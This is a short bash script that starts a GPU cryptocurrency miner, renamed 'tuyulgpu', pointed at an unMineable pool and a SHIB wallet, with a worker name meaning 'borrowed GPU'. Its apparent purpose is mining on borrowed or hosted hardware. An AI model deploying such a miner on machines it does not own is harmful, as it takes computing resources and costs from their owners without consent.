#!/bin/bash

POOL=rx.unmineable.com:3333

WALLET=SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu

./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
